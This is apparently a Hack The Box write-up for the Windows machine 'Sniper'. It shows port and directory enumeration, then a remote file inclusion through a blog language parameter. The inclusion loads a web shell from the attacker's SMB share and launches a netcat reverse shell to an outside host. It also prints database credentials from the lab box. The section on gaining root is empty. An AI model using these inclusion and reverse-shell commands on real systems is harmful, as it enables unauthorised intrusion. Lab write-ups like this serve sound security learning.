---
title: "[HTB] Machine: Sniper"
description: "[HTB] Machine: Sniper"
date: 2023-09-11
menu:
  sidebar:
    name: "[HTB] Machine: Sniper"
    identifier: htb-machine-Sniper
    parent: htb-machines-windows
    weight: 10
hero: images/sniper.png
tags: ["HTB"]
---

# Sniper
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.10.151 -T4                   
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-11 19:59 BST
Stats: 0:17:07 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Nmap scan report for 10.10.10.151
Host is up (0.024s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49667/tcp open  unknown
```
```
└─$ nmap -Pn -p80,135,139,445 -sC -sV 10.10.10.151 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-11 20:17 BST
Nmap scan report for 10.10.10.151 (10.10.10.151)
Host is up (0.13s latency).

PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Sniper Co.
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m22s
| smb2-time: 
|   date: 2023-09-12T02:17:13
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required


```
- `smb`
```
└─$ smbclient -N -L //10.10.10.151                                                    
session setup failed: NT_STATUS_ACCESS_DENIED                                            
```

- Web Server

![](./images/1.png)

- `gobuster`
```
└─$ gobuster dir -u http://10.10.10.151/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,asp,aspx --no-error
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.151/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,asp,aspx
[+] Timeout:                 10s
===============================================================
2023/09/12 15:57:15 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 150] [--> http://10.10.10.151/images/]
/blog                 (Status: 301) [Size: 148] [--> http://10.10.10.151/blog/]
/user                 (Status: 301) [Size: 148] [--> http://10.10.10.151/user/]
/Images               (Status: 301) [Size: 150] [--> http://10.10.10.151/Images/]
/css                  (Status: 301) [Size: 147] [--> http://10.10.10.151/css/]
/js                   (Status: 301) [Size: 146] [--> http://10.10.10.151/js/]

```

## Foothold
- `/blog`

![](./images/2.png)

- It looks like we have a `LFI`

```
└─$ curl 'http://10.10.10.151/blog/?lang=\Windows\System32\drivers\etc\hosts'

<html>
...
</html>
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost
</body>
</html>

```

- And `RFI`

![](./images/4.png)

- Let's try `RFI`
```
└─$ curl 'http://10.10.10.151/blog/?lang=\\10.10.16.9\share\shell.php&cmd=whoami'
...
</html>
nt authority\iusr
</body>
</html>
****
```

- Let's get reverse shell
```
└─$ curl 'http://10.10.10.151/blog/?lang=\\10.10.16.9\share\shell.php&cmd=\\10.10.16.9\share\nc64.exe+10.10.16.9+6666+-e+cmd.exe'

```
```
└─$ nc -vlnp 6666                                                                               
listening on [any] 6666 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.151] 49678
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\blog>

```
## User
- `C:\inetpub\wwwroot\` has `user` folder
```
PS C:\inetpub\wwwroot\user> dir
dir


    Directory: C:\inetpub\wwwroot\user


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        4/11/2019   5:52 AM                css                                                                   
d-----        4/11/2019   5:23 AM                fonts                                                                 
d-----        4/11/2019   5:23 AM                images                                                                
d-----        4/11/2019   5:23 AM                js                                                                    
d-----        4/11/2019   5:23 AM                vendor                                                                
-a----        4/11/2019   5:15 PM            108 auth.php                                                              
-a----        4/11/2019  10:51 AM            337 db.php                                                                
-a----        4/11/2019   6:18 AM           4639 index.php                                                             
-a----        4/11/2019   6:10 AM           6463 login.php                                                             
-a----         4/8/2019  11:04 PM            148 logout.php                                                            
-a----        10/1/2019   8:42 AM           7192 registration.php                                                      
-a----        8/14/2019  10:35 PM           7004 registration_old123123123847.php
```

- `db.php` has creds
```
PS C:\inetpub\wwwroot\user> type db.php
type db.php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>

```

- We can try the creds as `Chris` user




## Root